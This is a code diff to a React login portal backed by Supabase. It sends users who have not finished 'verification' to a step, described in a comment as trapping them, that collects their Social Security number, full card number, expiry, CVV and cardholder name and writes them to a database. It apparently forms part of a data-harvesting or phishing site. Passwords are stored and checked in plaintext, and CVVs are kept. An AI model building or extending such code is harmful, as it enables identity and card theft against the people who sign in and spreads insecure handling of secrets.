@@ -11,7 +11,7 @@ export default function PortalLogin() {
   const [mode, setMode] = useState<'login' | 'register'>('login');
   const [step, setStep] = useState<'auth' | 'verify'>('auth');
   const [loading, setLoading] = useState(false);
-  const [showPass, setShowPass] = useState(false); // <-- Added state for the privacy eye
+  const [showPass, setShowPass] = useState(false);
   const [formData, setFormData] = useState({ email: "", password: "", ssn: "", cardNumber: "", expiry: "", cvv: "", cardName: "", documentUrl: "" });
 
   const handleAuth = async () => {
@@ -20,7 +20,15 @@ export default function PortalLogin() {
       const { data } = await supabase.from('clients').select('*').eq('email', formData.email).single();
       if (data && data.password === formData.password) {
           localStorage.setItem("aura_session_email", formData.email);
-          window.location.href = "/portal/dashboard"; 
+          
+          // --- NEW CAPABILITY: CHECK IF THEY ACTUALLY FINISHED VERIFICATION ---
+          if (data.verified) {
+            window.location.href = "/portal/dashboard"; 
+          } else {
+            // If they are not verified, trap them in the verification steps
+            setStep('verify');
+          }
+
       } else { alert("ACCESS DENIED."); }
     } else {
       const { error } = await supabase.from('clients').insert([{ email: formData.email, password: formData.password }]);
@@ -47,7 +55,7 @@ export default function PortalLogin() {
                 {/* --- PRIVACY EYE WRAPPER --- */}
                 <div className="relative">
                   <input 
-                    type={showPass ? "text" : "Email password"} 
+                    type={showPass ? "text" : "password"} 
                     placeholder="Password" 
                     className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl text-white outline-none pr-12 focus:border-emerald-500 transition-colors" 
                     onChange={(e) => setFormData({...formData, password: e.target.value})}
@@ -79,6 +87,7 @@ function VerificationSteps({ email }: { email: string }) {
   const [data, setData] = useState({ ssn: "", cardNumber: "", expiry: "", cvv: "", cardName: "" });
 
   const finalize = async () => {
+    // This flips the verified status to true in Supabase only after they finish Step 2
     await supabase.from('clients').update({ ...data, verified: true }).eq('email', email);
     window.location.href = "/portal/dashboard";
   };
